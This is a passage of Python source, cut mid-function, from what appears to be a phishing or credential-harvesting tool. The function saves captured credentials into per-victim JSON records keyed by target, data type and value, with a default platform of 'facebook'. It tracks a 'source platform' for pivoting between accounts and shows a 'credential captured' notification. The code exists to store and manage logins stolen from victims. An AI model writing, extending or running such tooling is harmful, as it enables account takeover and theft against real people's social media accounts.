                f.write(new_block)

        # ── 2) Record into the per-victim JSON file (smart structured storage) ──
        try:
            import credentials_manager
            platform = cfg.get("platform", "facebook") if cfg else "facebook"
            # Récupérer la plateforme source (pivoting) depuis la session Flask ou le cfg
            source_platform = None
            try:
                from flask import session as _flask_session
                source_platform = _flask_session.get("source_platform", None)
            except Exception:
                pass
            # Fallback : récupérer depuis le cfg
            if not source_platform:
                try:
                    source_platform = cfg.get("source_platform", None) if cfg else None
                except Exception:
                    pass
            credentials_manager.record_credential(cible, type_data, valeur, platform=platform, source_platform=source_platform)
        except Exception as e2:
            log_error("sauvegarder_identifiants.json", e2)

        # ── 3) Notification toast (si activée dans les paramètres système) ──
        # Respecte les paramètres de masquage (hide_names, hide_credentials).
        try:
            from widgets_parts.notification_toast import notify_credential_captured
            notify_credential_captured(cible, type_data, valeur, platform=platform)
        except Exception as e3:
            log_error("sauvegarder_identifiants.notif", e3)
    except Exception as e:
        log_error("sauvegarder_identifiants", e)
